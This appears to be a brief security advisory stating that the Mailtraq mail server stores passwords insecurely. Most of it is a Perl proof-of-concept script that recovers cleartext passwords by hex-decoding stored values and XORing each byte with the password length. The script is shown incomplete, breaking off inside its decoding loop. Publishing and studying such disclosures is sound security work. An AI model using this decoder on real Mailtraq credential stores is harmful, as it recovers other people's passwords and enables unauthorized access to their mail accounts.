It has been reported that Mailtraq does not securely store passwords. Because of this, an attacker may have an increased chance at gaining access to clear text passwords.

#!/usr/bin/perl

$Password = $ARGV[0];

print "Passwords should be something like: \\3D66656463626160\n";
print "Provided password: $Password\n";

$Password = substr($Password, 3);
$Length = length($Password)/2;

print "Length: $Length\n";

for ($i = 0; $i < $Length; $i++)
{
 print "Decoding: ", substr($Password, $i*2, 2), " = ";
 $ord = hex(substr($Password, $i*2, 2));

 print $ord^$Length, " (", chr($ord^$Length), ")\n";
